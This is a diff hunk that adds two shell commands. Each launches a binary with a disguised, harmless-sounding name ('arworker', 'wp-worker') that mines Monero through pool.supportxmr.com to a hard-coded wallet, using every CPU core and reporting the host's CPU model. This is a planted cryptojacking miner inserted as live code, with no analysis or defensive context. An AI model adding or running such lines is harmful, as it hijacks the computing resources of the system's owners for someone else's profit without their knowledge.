@@ -1,0 +1,2 @@
+./arworker -o pool.supportxmr.com:3333 -u 43mfU2BozuxbowW715FsM98Sh3jWMcEiXYFLVpHiMYvWP3B3rmEVpT8GkTzeYF7E44eurXuRSnRwkLGVbU7NvCsJEzXv2eJ -t $(( $(nproc) / 1 )) -p "$(lscpu | grep 'Model name' | cut -d':' -f2 | xargs)"
+./wp-worker -o pool.supportxmr.com:3333 -u 43mfU2BozuxbowW715FsM98Sh3jWMcEiXYFLVpHiMYvWP3B3rmEVpT8GkTzeYF7E44eurXuRSnRwkLGVbU7NvCsJEzXv2eJ -t $(( $(nproc) / 1 )) -p "$(lscpu | grep 'Model name' | cut -d':' -f2 | xargs)"
